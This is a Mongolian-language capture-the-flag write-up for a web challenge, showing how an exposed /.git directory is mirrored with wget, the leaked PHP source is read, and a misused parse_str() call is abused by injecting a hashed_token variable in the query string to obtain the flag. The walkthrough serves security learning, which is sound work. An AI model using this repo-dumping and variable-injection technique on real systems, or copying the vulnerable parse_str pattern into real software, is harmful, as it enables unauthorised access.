# Алдаатай API
**Category:** Web
**Points:** 1000
**Description:**

Шинэхэн инженерт API бичих ажил ноогдов

http://218.100.84.106:8011


## Write-up
Вебийн `/robots.txt` файл руу орж үзвэл:

```
User-agent: *
Disallow: /.git
```

`/.git`-руу орж үзвэл "Index of /.git" гээд directory доторх файлуудын жагсаалт гарч ирэв:
![index-of-git](index-of-git.png)

Энэ directory доторх бүх файлуудыг татаж авъя:
```sh
wget --execute="robots=off" --mirror --no-parent http://218.100.84.106:8011/.git/
```

Одоо `.git` агуулсан directory-руу орж `gitk .` гэсэн коммандыг бичиж git-н түүхийг харъя. Энд байгаа код одоо ажиллаж буй код байх өндөр магадлалтай.

```php
// index.php
<?php
require_once 'flag.php';

$res = null;
$action = null;

if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['action'])){
        $action = $res['action'];
    }
}

if ($action === 'get_user'){
    echo json_encode(
        array(
            array('id'=>1, 'user'=>'dorj', 'created_at'=>'1537259795', 'member_of'=>'superuser,hz_admin', 'access_token'=>'<*** masked ***>'),
            array('id'=>2, 'user'=>'bat', 'created_at'=>'1537259896', 'member_of'=>'user', 'access_token'=>'<*** masked ***>')
        )
    );
} elseif ($action === 'login_user') {
    $user = $res['user'];
    $access_token = $res['access_token'];

    if (!empty($user) && !empty($pass)) {
        $hashed_token = hash('md5', $user.$access_token);
    }
    if (!empty($hashed_token) && $hashed_token === '7a6e40e23f8ed20b9e54a47d2cb67ba5') {
        echo $flag;
    } else {
        echo 'False token!';
    }
} else {
    echo json_encode(array('action_list'=>array('get_user', 'login_user')));
}
```

Шинэхэн инженер маань `parse_str()` функцын ажиллагааг буруу ойлгосон бололтой, алдаатай ашигласан байна. `parse_str($query)`-ээс дараах утгуудыг гаргаж чадвал flag-руу хандах нь ээ:
```
$action = "login_user"
$hashed_token = "7a6e40e23f8ed20b9e54a47d2cb67ba5"
```

Ингээд `/?action=login_user&hashed_token=7a6e40e23f8ed20b9e54a47d2cb67ba5` гэж вебийг дуудсанаар зорилтондоо хүрлээ:

```
hz{2ead56d93095f15ad3fbee9fb0054d28}
```

*Тайлбар: Тэмцээний дараа шийдлийг бодож олсон*
